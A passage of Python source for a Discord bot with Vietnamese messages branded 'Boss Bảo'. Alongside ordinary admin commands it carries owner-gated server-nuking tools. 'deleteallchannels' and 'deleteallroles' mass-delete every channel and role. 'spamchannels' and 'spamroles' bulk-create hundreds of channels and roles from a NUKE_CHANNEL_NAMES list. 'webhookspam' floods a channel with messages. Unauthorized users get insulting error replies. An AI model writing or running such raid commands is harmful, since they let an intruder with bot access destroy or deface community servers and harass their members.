            description=f"📌 **Kênh:** {channel.mention}\n🔓 Mọi người đã thấy được!\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@reveal_channel.error
async def reveal_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="vc")
@is_bot_owner()
async def create_voice_channel(ctx, *, name: str):
    try:
        channel = await ctx.guild.create_voice_channel(name)
        embed = discord.Embed(
            title="🔊 ĐÃ TẠO VOICE CHANNEL",
            description=f"📌 **Tên:** {channel.mention}\n👑 **Người tạo:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@create_voice_channel.error
async def create_voice_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="clonechannel")
@is_bot_owner()
async def clone_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        new_channel = await channel.clone()
        embed = discord.Embed(
            title="📋 ĐÃ CLONE KÊNH",
            description=f"✅ Đã clone {channel.mention} thành {new_channel.mention}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@clone_channel.error
async def clone_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deleteallchannels")
@is_bot_owner()
async def delete_all_channels(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ 🌈 **XÁC NHẬN XÓA TẤT CẢ KÊNH** 🌈 ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ xóa **TOÀN BỘ** kênh trong server\n\n"
                f"🔹 **Gõ n! confirmdelete để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "n! confirmdelete":
                await ctx.send("❌ Lệnh xóa kênh đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ.")
            return
        embed = discord.Embed(
            title="🚀 🌈 **ĐANG XÓA TẤT CẢ KÊNH...** 🌈",
            description="🔥 **Đang thực hiện...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        channels = list(ctx.guild.channels)
        for i in range(0, len(channels), 15):
            batch = channels[i:i+15]
            tasks = [ch.delete() for ch in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.5)
        complete_embed = discord.Embed(
            title="✅ 🌈 **XÓA KÊNH HOÀN TẤT** 🌈",
            description="🎉 **Đã xóa thành công tất cả kênh!**",
            color=0x00FF00
        )
        await send_log(ctx.guild.id, complete_embed)
        try:
            await ctx.author.send(embed=complete_embed)
        except:
            pass
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_all_channels.error
async def delete_all_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="spamchannels")
@is_bot_owner()
async def spam_channels(ctx, amount: int = 100):
    try:
        if amount > 200:
            amount = 200
        embed = discord.Embed(
            title="🚀 🌈 **KÍCH HOẠT TẠO KÊNH SPAM CHO BOSS BẢO** 🌈",
            description=f"🔥 **Đang tạo {amount} kênh...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for i in range(0, amount, 10):
            batch = []
            for j in range(i, min(i+10, amount)):
                channel_name = NUKE_CHANNEL_NAMES[j % len(NUKE_CHANNEL_NAMES)]
                batch.append(ctx.guild.create_text_channel(name=channel_name))
            await asyncio.gather(*batch, return_exceptions=True)
            await asyncio.sleep(0.5)
        complete_embed = discord.Embed(
            title="✅ 🌈 **TẠO KÊNH HOÀN TẤT** 🌈",
            description=f"🎉 **Đã tạo thành công {amount} kênh spam!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_channels.error
async def spam_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="spamroles")
@is_bot_owner()
async def spam_roles(ctx, amount: int = 50):
    try:
        if amount > 250:
            amount = 250
        embed = discord.Embed(
            title="🚀 🌈 **TẠO ROLE SPAM** 🌈",
            description=f"🔥 **Đang tạo {amount} role...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for i in range(0, amount, 10):
            batch = []
            for j in range(i, min(i+10, amount)):
                role_name = NUKE_CHANNEL_NAMES[j % len(NUKE_CHANNEL_NAMES)]
                color = discord.Color(random.randint(0, 0xFFFFFF))
                batch.append(ctx.guild.create_role(name=role_name, color=color, hoist=True, mentionable=True))
            await asyncio.gather(*batch, return_exceptions=True)
            await asyncio.sleep(0.5)
        complete_embed = discord.Embed(
            title="✅ 🌈 **TẠO ROLE HOÀN TẤT** 🌈",
            description=f"🎉 **Đã xong {amount} role!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_roles.error
async def spam_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deleteallroles")
@is_bot_owner()
async def delete_all_roles(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ 🌈 **XÁC NHẬN XÓA TẤT CẢ ROLE** 🌈 ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ xóa **TOÀN BỘ** role\n\n"
                f"🔹 **Gõ n! confirmdeleteroles để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "n! confirmdeleteroles":
                await ctx.send("❌ Hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian.")
            return
        embed = discord.Embed(
            title="🚀 🌈 **ĐANG XÓA TẤT CẢ ROLE...** 🌈",
            description="🔥 **Đang xử lý...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        roles = [r for r in ctx.guild.roles if r.name != "@everyone"]
        for i in range(0, len(roles), 10):
            batch = roles[i:i+10]
            tasks = [r.delete() for r in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.5)
        complete_embed = discord.Embed(
            title="✅ 🌈 **XÓA ROLE HOÀN TẤT** 🌈",
            description="🎉 **Đã xóa xong!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_all_roles.error
async def delete_all_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="slowmode")
@is_bot_owner()
async def set_slowmode(ctx, seconds: int = 0):
    if seconds < 0 or seconds > 21600:
        await ctx.send("❌ Nhập từ 0 đến 21600 giây!")
        return
    try:
        await ctx.channel.edit(slowmode_delay=seconds)
        embed = discord.Embed(
            title="🐢 ĐÃ CÀI SLOWMODE",
            description=f"📌 **Kênh:** {ctx.channel.mention}\n⏳ **Slowmode:** {seconds} giây\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00 if seconds > 0 else 0xFF9900
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_slowmode.error
async def set_slowmode_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="nick")
@is_bot_owner()
async def set_nickname(ctx, member: discord.Member, *, nickname: str = None):
    if nickname is None:
        await ctx.send("❌ Vui lòng nhập nickname! VD: `n! nick @user Tên mới`")
        return
    try:
        old_name = member.display_name
        await member.edit(nick=nickname)
        embed = discord.Embed(
            title="✏️ ĐÃ ĐỔI NICKNAME",
            description=f"👤 **Người:** {member.mention}\n📝 **Tên cũ:** `{old_name}`\n📝 **Tên mới:** `{nickname}`\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_nickname.error
async def set_nickname_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="resetnick")
@is_bot_owner()
async def reset_nickname(ctx, member: discord.Member):
    try:
        await member.edit(nick=None)
        embed = discord.Embed(
            title="🔄 ĐÃ RESET NICKNAME",
            description=f"👤 **Người:** {member.mention}\n📝 Đã reset về tên gốc\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@reset_nickname.error
async def reset_nickname_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setservername")
@is_bot_owner()
async def set_server_name(ctx, *, new_name: str):
    try:
        if len(new_name) > 100:
            new_name = new_name[:100]
        await ctx.guild.edit(name=new_name)
        embed = discord.Embed(
            title="✅ 🌈 **THAY ĐỔI TÊN SERVER THÀNH CÔNG** 🌈",
            description=f"🎉 **Đã đổi thành:** {new_name}",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_server_name.error
async def set_server_name_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setservericon")
@is_bot_owner()
async def set_server_icon(ctx, url: str = None):
    try:
        if url:
            if not url.startswith(('http://', 'https://')):
                raise ValueError("URL không hợp lệ")
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        raise ValueError("Không tải được ảnh")
                    image_data = await resp.read()
        else:
            image_data = None
        await ctx.guild.edit(icon=image_data)
        embed = discord.Embed(
            title="✅ 🌈 **THAY ĐỔI ICON SERVER THÀNH CÔNG** 🌈",
            description="🎉 **Icon đã cập nhật!**",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_server_icon.error
async def set_server_icon_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="rename")
@is_bot_owner()
async def rename_server(ctx, *, new_name: str):
    if len(new_name) > 100:
        new_name = new_name[:100]
    try:
        old_name = ctx.guild.name
        await ctx.guild.edit(name=new_name)
        embed = discord.Embed(
            title="✏️ ĐÃ ĐỔI TÊN SERVER",
            description=f"📝 **Tên cũ:** `{old_name}`\n📝 **Tên mới:** `{new_name}`\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@rename_server.error
async def rename_server_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="icon")
@is_bot_owner()
async def set_icon(ctx, url: str = None):
    try:
        if url:
            if not url.startswith(('http://', 'https://')):
                await ctx.send("❌ URL không hợp lệ!")
                return
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        await ctx.send("❌ Không tải được ảnh!")
                        return
                    image_data = await resp.read()
        elif ctx.message.attachments:
            image_data = await ctx.message.attachments[0].read()
        else:
            await ctx.send("❌ Vui lòng upload ảnh hoặc nhập URL!")
            return
        await ctx.guild.edit(icon=image_data)
        embed = discord.Embed(
            title="🖼️ ĐÃ ĐỔI ICON SERVER",
            description=f"✅ Icon đã được cập nhật!\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_icon.error
async def set_icon_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="emoji")
@is_bot_owner()
async def list_emoji(ctx):
    emojis = ctx.guild.emojis
    if not emojis:
        await ctx.send("📭 Server này chưa có emoji nào!")
        return
    emoji_list = []
    for e in emojis:
        emoji_list.append(f"{e} - `{e.name}`")
    embed = discord.Embed(
        title=f"🎨 DANH SÁCH EMOJI ({len(emojis)} emoji)",
        description="\n".join(emoji_list[:25]),
        color=0x00CCFF
    )
    if len(emoji_list) > 25:
        embed.set_footer(text=f"Hiển thị 25/{len(emoji_list)} emoji. Dùng n! emoji để xem thêm.")
    else:
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
    await ctx.send(embed=embed)

@list_emoji.error
async def list_emoji_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="steal")
@is_bot_owner()
async def steal_emoji(ctx, emoji_id: int, *, name: str = None):
    if name is None:
        name = f"emoji_{emoji_id}"
    try:
        emoji = await bot.fetch_emoji(emoji_id)
        if not emoji:
            await ctx.send("❌ Không tìm thấy emoji!")
            return
        async with aiohttp.ClientSession() as session:
            async with session.get(emoji.url) as resp:
                if resp.status != 200:
                    await ctx.send("❌ Không tải được ảnh!")
                    return
                image_data = await resp.read()
        new_emoji = await ctx.guild.create_custom_emoji(name=name, image=image_data)
        embed = discord.Embed(
            title="🎨 ĐÃ COPY EMOJI",
            description=f"✅ {new_emoji} - `{new_emoji.name}`\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@steal_emoji.error
async def steal_emoji_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="webhookspam")
@is_bot_owner()
async def webhook_spam(ctx, *, content: str = "Boss Bảo đã spam webhook!"):
    try:
        webhook = await ctx.channel.create_webhook(name="BossBaoWebhook")
        embed = discord.Embed(
            title="🚀 🌈 **KÍCH HOẠT WEBHOOK SPAM** 🌈",
            description=f"🔥 Đang spam webhook trong kênh {ctx.channel.mention}...",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for _ in range(20):
            await webhook.send(content, username="Boss Bảo", avatar_url=ctx.author.display_avatar.url)
            await asyncio.sleep(0.2)
        await webhook.delete()
        embed = discord.Embed(
            title="✅ 🌈 **WEBHOOK SPAM HOÀN TẤT** 🌈",
            description="🎉 Đã spam 20 tin nhắn qua webhook!",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@webhook_spam.error
async def webhook_spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH CÀI ĐẶT KÊNH (WELCOME, GOODBYE, LEVEL, LOG) ====================
@bot.command(name="setwelcome")
@is_bot_owner()
async def set_welcome_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        if str(ctx.guild.id) in WELCOME_CHANNELS:
            del WELCOME_CHANNELS[str(ctx.guild.id)]
            save_all_data()
            embed = discord.Embed(
                title="✅ ĐÃ TẮT KÊNH CHÀO MỪNG",
                description="🎉 Hệ thống đã ngừng gửi tin nhắn chào mừng!",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="⚠️ CHƯA CÀI ĐẶT",
                description="🔹 Hiện chưa có kênh chào mừng nào được cài đặt.\n🔹 Cú pháp: `n! setwelcome #kênh`",
                color=0xFF9900
            )
            await ctx.send(embed=embed)
        return
    WELCOME_CHANNELS[str(ctx.guild.id)] = channel.id
    save_all_data()
    embed = discord.Embed(
        title="🎉 THIẾT LẬP KÊNH CHÀO MỪNG",
        description=f"✅ Đã thiết lập kênh chào mừng thành công tại {channel.mention}!",
        color=0x00FF00
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@set_welcome_channel.error
async def set_welcome_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setgoodbye")
@is_bot_owner()
async def set_goodbye_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        if str(ctx.guild.id) in GOODBYE_CHANNELS:
            del GOODBYE_CHANNELS[str(ctx.guild.id)]
            save_all_data()
            embed = discord.Embed(
                title="✅ ĐÃ TẮT KÊNH TẠM BIỆT",
                description="🎉 Hệ thống đã ngừng gửi tin nhắn tạm biệt!",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="⚠️ CHƯA CÀI ĐẶT",
                description="🔹 Hiện chưa có kênh tạm biệt nào được cài đặt.\n🔹 Cú pháp: `n! setgoodbye #kênh`",
                color=0xFF9900
            )
            await ctx.send(embed=embed)
        return
    GOODBYE_CHANNELS[str(ctx.guild.id)] = channel.id
    save_all_data()
    embed = discord.Embed(
        title="😢 THIẾT LẬP KÊNH TẠM BIỆT",
        description=f"✅ Đã thiết lập kênh tạm biệt thành công tại {channel.mention}!",
        color=0xFF0000
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@set_goodbye_channel.error
async def set_goodbye_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setlevelchannel", aliases=["channelslv"])
@is_bot_owner()
async def set_level_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        if str(ctx.guild.id) in SERVER_LEVEL_CHANNELS:
            del SERVER_LEVEL_CHANNELS[str(ctx.guild.id)]
            save_all_data()
            embed = discord.Embed(
                title="🔇 ĐÃ TẮT THÔNG BÁO LEVEL",
                description="🎉 Hệ thống đã ngừng gửi thông báo thăng cấp!",
                color=0x00FF00
            )
            embed.set_footer(text="Boss Bảo đã tắt thông báo level 💖")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="⚠️ CHƯA CÀI ĐẶT KÊNH LEVEL",
                description=(
                    "🔹 Hiện chưa có kênh thông báo level nào được cài đặt.\n"
                    "🔹 **Cú pháp:** `n! setlevelchannel #kênh` hoặc `n! channelslv #kênh`\n"
                    "🔹 **Ví dụ:** `n! channelslv #level`\n\n"
                    "📌 **Chức năng:** Tự động thông báo khi thành viên lên level"
                ),
                color=0xFF9900
            )
            embed.set_footer(text="Hệ thống level tự động phục vụ Boss Bảo 💖")
            await ctx.send(embed=embed)
        return
    SERVER_LEVEL_CHANNELS[str(ctx.guild.id)] = channel.id
    save_all_data()
    try:
        test_embed = discord.Embed(
            title="🎉 LEVEL SYSTEM ACTIVATED",
            description=(
                f"🔹 Kênh thông báo level đã được cài đặt thành công!\n"
                f"🔹 Người cài: {ctx.author.mention}\n"
                f"🔹 Server: {ctx.guild.name}\n\n"
                f"✨ Khi thành viên lên level, sẽ có thông báo tại đây!"
            ),
            color=0x00FF00,
            timestamp=datetime.now()
        )
        test_embed.set_image(url="https://i.pinimg.com/originals/c3/2c/e0/c32ce0a583261b5a296afc194671a5f9.gif")
        test_embed.set_footer(text="Hệ thống level tự động")
        await channel.send(embed=test_embed)
    except:
        pass
    embed = discord.Embed(
        title="📈 THIẾT LẬP KÊNH LEVEL UP",
        description=f"✅ Đã thiết lập kênh thông báo Level Up tại {channel.mention}!",
        color=0xFFD700
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@set_level_channel.error
async def set_level_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="log", aliases=["channelslog"])
@is_bot_owner()
async def set_log_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        if str(ctx.guild.id) in SERVER_LOG_CHANNELS:
            del SERVER_LOG_CHANNELS[str(ctx.guild.id)]
            save_all_data()
            embed = discord.Embed(
                title="🔇 ĐÃ TẮT LOG SỰ KIỆN",
                description="🎉 Hệ thống đã ngừng gửi log sự kiện!",
                color=0x00FF00
            )
            embed.set_footer(text="Boss Bảo đã tắt log 💖")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="⚠️ CHƯA CÀI ĐẶT LOG",
                description=(
                    "🔹 Hiện chưa có kênh log nào được cài đặt.\n"
                    "🔹 **Cú pháp:** `n! log #kênh` hoặc `n! channelslog #kênh`\n"
                    "🔹 **Ví dụ:** `n! log #log`"
                ),
                color=0xFF9900
            )
            embed.set_footer(text="Hệ thống log tự động phục vụ Boss Bảo 💖")
            await ctx.send(embed=embed)
        return

    SERVER_LOG_CHANNELS[str(ctx.guild.id)] = channel.id
    save_all_data()
    try:
        test_embed = discord.Embed(
            title="✅ LOG SYSTEM ACTIVATED",
            description=f"🔹 Kênh log đã được cài đặt thành công!\n🔹 Người cài: {ctx.author.mention}\n🔹 Server: {ctx.guild.name}",
            color=0x00FF00,
            timestamp=datetime.now()
        )
        test_embed.set_footer(text="Hệ thống log tự động")
        await channel.send(embed=test_embed)
    except:
        pass

    embed = discord.Embed(
        title="✅ ĐÃ THIẾT LẬP KÊNH LOG SỰ KIỆN",
        description=(
            f"📌 **Kênh log:** {channel.mention}\n"
            f"👑 **Người cài:** {ctx.author.mention}\n"
            f"📋 **Sự kiện được log:**\n"
            f"• 🗑️ Tin nhắn bị xóa\n"
            f"• 🆕 Kênh mới được tạo\n"
            f"• 🗑️ Kênh bị xóa\n"
            f"• 👋 Thành viên join/leave\n"
            f"• ⚡ Các sự kiện quan trọng khác"
        ),
        color=0x00FF00
    )
    embed.set_footer(text="Hệ thống log tự động phục vụ Boss Bảo 💖")
    await ctx.send(embed=embed)

@set_log_channel.error
async def set_log_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH THÔNG TIN & HỆ THỐNG ====================
@bot.command(name="stats")
async def server_stats(ctx):
    guild = ctx.guild
    embed = discord.Embed(
        title=f"📊 THỐNG KÊ SERVER {guild.name.upper()}",
        color=0x00FF00
    )
    embed.add_field(name="🆔 Server ID", value=f"`{guild.id}`", inline=True)
    embed.add_field(name="👑 Chủ Server", value=guild.owner.mention if guild.owner else "Không rõ", inline=True)
    embed.add_field(name="👥 Số thành viên", value=f"`{guild.member_count}` người", inline=True)
    embed.add_field(name="💬 Kênh Văn Bản", value=f"`{len(guild.text_channels)}` kênh", inline=True)
    embed.add_field(name="🔊 Kênh Thoại", value=f"`{len(guild.voice_channels)}` kênh", inline=True)
    embed.add_field(name="🎭 Số lượng Role", value=f"`{len(guild.roles)}` roles", inline=True)
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
    await ctx.send(embed=embed)

@bot.command(name="serverinfo")
async def server_info(ctx):
    guild = ctx.guild
    embed = discord.Embed(
        title=f"🌐 THÔNG TIN SERVER: {guild.name}",
        description=f"**ID:** `{guild.id}`\n**Chủ sở hữu:** {guild.owner.mention if guild.owner else 'Không có'}\n**Ngày tạo:** {guild.created_at.strftime('%d/%m/%Y %H:%M:%S')}",
        color=0x00CCFF
    )
    embed.add_field(name="👥 Thành viên", value=guild.member_count, inline=True)
    embed.add_field(name="📢 Kênh", value=len(guild.channels), inline=True)
    embed.add_field(name="🎭 Role", value=len(guild.roles), inline=True)
    embed.add_field(name="📊 Boost", value=guild.premium_subscription_count or 0, inline=True)
    embed.add_field(name="🌍 Khu vực", value=guild.preferred_locale or "Không có", inline=True)
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    embed.set_footer(text="Hệ thống thông tin Boss Bảo 💖")
    await ctx.send(embed=embed)

@bot.command(name="ping")
async def ping(ctx):
    latency = round(bot.latency * 1000)
    embed = discord.Embed(
        title="🏓 PONG!",
        description=f"⏱️ Độ trễ: **{latency}ms**",
        color=0x00FF00 if latency < 200 else 0xFF9900
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@bot.command(name="topcoin")
async def top_coin(ctx):
    sorted_coins = sorted(user_coins.items(), key=lambda x: x[1], reverse=True)[:10]
    if not sorted_coins:
        await ctx.send("Chưa có dữ liệu coin.")
        return
    desc = ""
    for idx, (uid, coins) in enumerate(sorted_coins, 1):
        user = bot.get_user(int(uid))
        name = user.name if user else f"ID:{uid}"
        desc += f"**{idx}.** {name} – `{coins:,}` coin\n"
    embed = discord.Embed(
        title="🏆 BẢNG XẾP HẠNG COIN",
        description=desc,
        color=0xFFD700
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@bot.command(name="toplevel")
async def top_level(ctx):
    sorted_levels = sorted(USER_LEVELS.items(), key=lambda x: x[1]["level"], reverse=True)[:10]
    if not sorted_levels:
        await ctx.send("Chưa có dữ liệu level.")
        return
    desc = ""
    for idx, (uid, data) in enumerate(sorted_levels, 1):
        user = bot.get_user(int(uid))
        name = user.name if user else f"ID:{uid}"
        desc += f"**{idx}.** {name} – Level {data['level']} (Exp: {data['exp']})\n"
    embed = discord.Embed(
        title="🏆 BẢNG XẾP HẠNG LEVEL",
        description=desc,
        color=0x00BFFF
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@bot.command(name="userinfo")
async def user_info(ctx, member: discord.Member = None):
    if member is None:
        member = ctx.author
    embed = discord.Embed(
        title=f"👤 THÔNG TIN: {member.display_name}",
        description=f"**ID:** `{member.id}`\n**Tên:** {member.mention}\n**Tên toàn cầu:** {member.name}#{member.discriminator or '0000'}",
        color=member.color
    )
    embed.add_field(name="📅 Ngày tham gia server", value=member.joined_at.strftime('%d/%m/%Y %H:%M:%S') if member.joined_at else "Không rõ", inline=False)
    embed.add_field(name="📅 Ngày tạo tài khoản", value=member.created_at.strftime('%d/%m/%Y %H:%M:%S'), inline=False)
    embed.add_field(name="🎭 Role cao nhất", value=member.top_role.mention if member.top_role else "Không có", inline=True)
    embed.add_field(name="🤖 Bot", value="Có" if member.bot else "Không", inline=True)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text="Hệ thống thông tin Boss Bảo 💖")
    await ctx.send(embed=embed)

@bot.command(name="avatar")
async def avatar(ctx, member: discord.Member = None):
    if member is None:
        member = ctx.author
    embed = discord.Embed(
        title=f"🖼️ AVATAR CỦA {member.display_name}",
        color=member.color
    )
    embed.set_image(url=member.display_avatar.url)
    embed.set_footer(text="Hệ thống Boss Bảo 💖")
    await ctx.send(embed=embed)

@bot.command(name="membercount")
async def member_count(ctx):
    guild = ctx.guild
    embed = discord.Embed(
        title="👥 SỐ LƯỢNG THÀNH VIÊN",
